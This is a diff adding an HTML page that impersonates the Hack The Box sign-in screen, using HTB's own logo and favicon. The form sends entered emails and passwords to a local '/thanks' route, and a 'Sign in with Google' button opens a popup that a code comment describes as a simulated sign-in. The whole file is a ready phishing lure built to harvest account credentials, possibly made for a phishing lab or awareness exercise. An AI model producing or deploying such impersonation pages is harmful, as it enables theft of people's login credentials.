@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Account</title>
+    <link rel="shortcut icon" href="https://account.hackthebox.com/images/HTB-favicon/favicon.ico" type="image/x-icon">
+</head>
+<style>
+    body {
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+    background-color: #121823;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: #ffffff;
+}
+
+.login-container {
+    position: relative;
+    width: 500px;
+}
+
+.logo {
+    position: absolute;
+    top: -60px; /* Ajusta este valor según sea necesario */
+    left: 0;
+    width: 200px;
+}
+
+.logo img {
+    width: 100%;
+}
+
+.login-box {
+    background-color: #1b2636;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+    text-align: center;
+}
+
+h2 {
+    text-align: left;
+    color: #ffffff;
+    font-weight: 530;
+    margin-bottom: 25px;
+    margin-top: -5px;
+}
+
+.input-group {
+    margin-bottom: 20px;
+    text-align: left;
+}
+
+.input-group label {
+    color: #8a9bb4;
+    font-size: 14px;
+    display: block;
+    margin-bottom: 5px;
+}
+
+.input-group input {
+    width: calc(100% - 4px); /* Ajustado para que tenga el mismo padding en ambos lados */
+    padding: 12px;
+    background-color: #1b2532;
+    border: 0.1px solid #3c4f67;
+    border-radius: 5px;
+    color: #ffffff;
+    font-size: 14px;
+    box-sizing: border-box; /* Asegura que el ancho incluya el padding y border */
+}
+
+.options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.remember-me {
+    display: flex;
+    align-items: center;
+}
+
+.remember-me input {
+    margin-right: 5px;
+}
+
+.remember-me label {
+    color: #8a9bb4;
+    font-size: 14px;
+}
+
+/* Estilo del contenedor del checkbox */
+.remember-me input[type="checkbox"] {
+    appearance: none; /* Oculta el estilo predeterminado del checkbox */
+    width: 20px;
+    height: 20px;
+    border: 2px solid #3c4f67; /* Borde personalizado */
+    border-radius: 5px; /* Esquinas redondeadas */
+    background-color: #1b2532;
+    cursor: pointer;
+    position: relative;
+    transition: background-color 0.1s ease;
+}
+
+.remember-me input[type="checkbox"]:checked {
+    background-color: #62ff00; /* Color de fondo al estar marcado */
+    border: 2px solid #62ff00; /* Cambia también el borde cuando esté marcado */
+}
+
+.remember-me input[type="checkbox"]:checked::after {
+    content: '✔'; /* La palomita */
+    font-size: 14px;
+    color: #000000; /* Color negro de la palomita */
+    position: absolute;
+    top: 0;
+    left: 4px; /* Ajusta esta posición si es necesario */
+    line-height: 18px;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 12px;
+    background-color: #2d3c4f;
+    border: none;
+    border-radius: 5px;
+    color: #828282;
+    font-size: 16px;
+    cursor: pointer;
+    font-weight: 600;
+    margin-bottom: 20px;
+    transition: background-color 0.3s ease;
+}
+
+.login-btn:hover {
+    background-color: #62ff00;
+}
+
+.or-separator {
+    color: #8a9bb4;
+    margin: 20px 0;
+    font-size: 14px;
+    text-transform: uppercase;
+}
+
+.social-login button {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #9e9e9e;
+    border-radius: 5px;
+    color: #ffffff;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 10px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+}
+
+.google-btn {
+    background: none;
+}
+
+.google-btn:hover {
+    background-color: #b7b7b71c;
+}
+
+</style>
+
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://account.hackthebox.com/images/logos/logo-htb.svg" alt="Hack The Box">
+        </div>
+        <div class="login-box">
+            <h2>Sign in to Hack The Box</h2>
+            <form action="/thanks" method="POST">
+                <div class="input-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div class="options">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Remember Me</label>
+                    </div>
+                </div>
+                <button type="submit" class="login-btn">Sign in</button>
+            </form>
+            <div class="or-separator">or</div>
+            <div class="social-login">
+                <button id="google-sign-in-btn" class="google-btn"><img src="https://ragsdalemartin.com/wp-content/uploads/2020/07/white-google-logo.png" style="width: 20px; padding-right: 5px;">Sign in with Google</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById("google-sign-in-btn").addEventListener("click", function(event) {
+            event.preventDefault();  // Previene el comportamiento predeterminado del botón
+            const url = "/google-sign-in";  // Ruta donde simulas el inicio de sesión
+            const windowFeatures = "width=800,height=600,scrollbars=yes";
+            window.open(url, "Sign in with Google", windowFeatures);
+        });
+    </script>    
+</body>
+</html>
